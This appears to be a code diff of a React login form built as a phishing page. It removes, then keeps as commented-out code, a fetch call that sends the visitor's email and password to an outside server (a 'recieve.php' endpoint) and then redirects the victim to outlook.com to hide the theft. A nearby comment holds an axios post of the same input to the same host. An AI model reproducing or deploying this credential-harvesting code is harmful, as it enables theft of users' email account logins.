@@ -27,26 +27,28 @@ function App() {
     }
 
     setLoading(true)
-    const formData = new FormData();
-    formData.append("email", input.email)
-    formData.append("password", input.password)
-		fetch('https://femzab.com.ng/recieve.php',{
-                    method: "POST",
-                    body: formData,
-                })
-                .then((response) => response.json())
-                .then((result) => {
-                    // user221999 ;
-                    setLoading(false)
-                    window.location.replace("https://outlook.com")
-                })
-                .catch((error) => {
-                    // alert(error);
-                    setLoading(false)
-                    console.log(error)
-                    setError('An error occurred, try again later')
-                })
-                .then(() => {});
+    setLoading(false)
+
+    // const formData = new FormData();
+    // formData.append("email", input.email)
+    // formData.append("password", input.password)
+		// fetch('https://femzab.com.ng/recieve.php',{
+    //                 method: "POST",
+    //                 body: formData,
+    //             })
+    //             .then((response) => response.json())
+    //             .then((result) => {
+    //                 // user221999 ;
+    //                 setLoading(false)
+    //                 window.location.replace("https://outlook.com")
+    //             })
+    //             .catch((error) => {
+    //                 // alert(error);
+    //                 setLoading(false)
+    //                 console.log(error)
+    //                 setError('An error occurred, try again later')
+    //             })
+    //             .then(() => {});
     // try{
     //   var fd = 
     //   await axios.post("https://femzab.com.ng/recieve.php", input)
